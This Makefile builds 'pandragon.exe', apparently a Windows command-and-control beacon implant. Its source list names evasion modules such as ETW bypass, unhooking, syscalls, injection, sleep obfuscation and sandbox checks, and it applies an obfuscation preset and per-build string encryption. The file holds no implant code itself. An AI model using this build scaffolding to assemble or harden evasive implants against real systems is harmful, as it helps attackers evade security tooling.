TARGET = x86_64-w64-windows-gnu
OUTPUT_DIR = build/beacon
OUTPUT = $(OUTPUT_DIR)/pandragon.exe

PYTHON = python3
CONFIG_BUILDER = tools/config_builder.py
CONFIG_FILE ?= Beacon/config/default.json
CONFIG_OUTPUT_DIR = Beacon/config
GENERATED_CONFIG = Beacon/include/generated_config.h

KEY_FILE = server/known_beacons.json

VERBOSE ?= 0
ifeq ($(VERBOSE),1)
    Q =
    ECHO = @true
    CXXFLAGS += -DVERBOSE
else
    Q = @
    ECHO = @echo
endif

# BUILD_SEED is evaluated ONCE per `make` invocation and passed to every
# translation unit as BUILD_TIME_RANDOM_SEED.  It MUST be a single per-build
# value (not per-TU) because Bastia's string obfuscation derives its per-string
# seed as BUILD_TIME_RANDOM_SEED ^ S.hash().  Per-TU seeds would cause strings
# defined in one TU to decrypt to garbage when accessed from another TU.
BUILD_SEED := $(shell $(PYTHON) -c "import random; print(hex(random.randrange(1<<64)))")

CXXFLAGS = -target $(TARGET) -nostdlib -nostartfiles -Oz -std=c++20 \
           -maes -fno-builtin -fno-threadsafe-statics -fno-exceptions \
           -Wall -flto=full -MD -MP -ffunction-sections -fdata-sections \
           -fvisibility=hidden -Wl,--build-id=none \
           -fno-unwind-tables -fno-asynchronous-unwind-tables \
           -I$(OUTPUT_DIR)/.. -I. -Iinclude -IBeacon/include \
           -DBUILD_TIME_RANDOM_SEED=$(BUILD_SEED)

ifneq ($(USE_ALBEDO),1)
    CXX = clang++
else
    CXX = albedo-clang
    CXXFLAGS := $(filter-out -flto=full, $(CXXFLAGS))
    ALBEDO := albedo
    export ALBEDO
    export ALBEDO_PRESET = offensive-prod
    export ALBEDO_PREOPT = Oz
    export ALBEDO_REAL_CC = clang++
endif

LDFLAGS = -fuse-ld=lld \
          -Wl,--entry=__start -Wl,--gc-sections -Wl,-s \
          -Wl,--no-dynamicbase -Wl,--subsystem,console

SOURCES = Beacon/core/main.cpp \
          Beacon/core/handlers.cpp \
          Beacon/core/pandragon_runtime.cpp \
          Beacon/core/resolver.cpp \
          Beacon/core/syscalls.cpp \
          Beacon/core/utils.cpp \
          Beacon/core/etw_bypass.cpp \
          Beacon/core/config_parser.cpp \
          Beacon/core/injection.cpp \
          Beacon/core/unhook.cpp \
           Beacon/core/sleep_obf.cpp \
           Beacon/core/sleep_morpheus.cpp \
           Beacon/core/sleep_utils.cpp \
          Beacon/libs/managers.cpp \
          Beacon/libs/network/winhttp.cpp \
          Beacon/libs/network/tcp_socket.cpp \
          Beacon/libs/network/pipe_transport.cpp \
          Beacon/libs/network/transport.cpp \
          Beacon/core/coff/beacon_compatibility.cpp \
          Beacon/core/coff/coff_loader.cpp \
          Beacon/core/coff/bof_runner.cpp \
          Beacon/core/coff/async_bof_manager.cpp \
          Beacon/core/coff/bof_cache.cpp \
          Beacon/core/sandbox.cpp \
          Beacon/core/coff/beacon_api_resolver.cpp \
           Beacon/libs/bastia/bastia.cpp \
           Beacon/libs/network/net_malleable.cpp \
           Beacon/libs/network/net_crypto.cpp \
           Beacon/libs/network/net_sysinfo.cpp \
           Beacon/libs/network/net_abstract.cpp

OBJECTS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.o)
DEPS = $(SOURCES:%.cpp=$(OUTPUT_DIR)/%.d)
-include $(DEPS)

ifeq ($(DEBUG),1)
    CXXFLAGS += -DDEBUG
    OUTPUT = $(OUTPUT_DIR)/pandragon_debug.exe
endif

.PHONY: all clean setup keys test ssl-cert \
        server gui run-server run-server-args run-gui

all: keys $(OUTPUT)
	$(ECHO) "[+] Beacon: $(OUTPUT)"

keys: $(KEY_FILE)

$(KEY_FILE):
	$(ECHO) "[*] Generating crypto key..."
	@$(PYTHON) -c "import json, os, hashlib; \
key = os.urandom(32); \
beacon_id = hashlib.sha256(key).hexdigest()[:16]; \
data = {'version': 2, 'beacons': {beacon_id: {'crypto_key': key.hex(), 'allowed_routes': []}}}; \
json.dump(data, open('$(KEY_FILE)', 'w'), indent=2); \
print('[+] Beacon ID:', beacon_id)"

$(GENERATED_CONFIG): $(CONFIG_FILE) $(CONFIG_BUILDER)
	@mkdir -p $(dir $@)
	$(ECHO) "[*] Config from $(CONFIG_FILE)..."
	$(Q)$(PYTHON) $(CONFIG_BUILDER) $(CONFIG_FILE) $(CONFIG_OUTPUT_DIR)

config: $(GENERATED_CONFIG)

$(OUTPUT): $(OBJECTS)
	$(CXX) $(CXXFLAGS) $(LDFLAGS) $^ -o $@

$(OUTPUT_DIR)/%.o: %.cpp $(GENERATED_CONFIG)
	@mkdir -p $(dir $@)
	$(CXX) $(CXXFLAGS) -c $< -o $@

setup:
	@git submodule update --init --recursive 2>/dev/null || true
	$(MAKE) -C server setup
	$(MAKE) -C gui venv
	$(ECHO) "[+] All set.  make server | make gui | make"

server:
	$(MAKE) -C server build

gui:
	$(MAKE) -C gui build

run-server:
	$(MAKE) -C server run

run-server-args:
	$(MAKE) -C server run-args ARGS="$(ARGS)"

run-gui:
	$(MAKE) -C gui run

ssl-cert:
	$(MAKE) -C server ssl-cert

test:
	$(MAKE) -C server test
	$(MAKE) -C Beacon/test

test-beacon:
	$(MAKE) -C Beacon/test

clean:
	rm -rf $(OUTPUT_DIR)
	rm -f $(GENERATED_CONFIG)
	rm -f Beacon/config/*.bin Beacon/config/include/generated_config.h Beacon/include/generated_config.h
	$(MAKE) -C server clean
	$(MAKE) -C gui clean
	find . -type d \( -name '__pycache__' -o -name '.pytest_cache' \) -exec rm -rf {} + 2>/dev/null || true
	find . -type f -name '*.pyc' -delete 2>/dev/null || true
	$(ECHO) "[+] Clean"
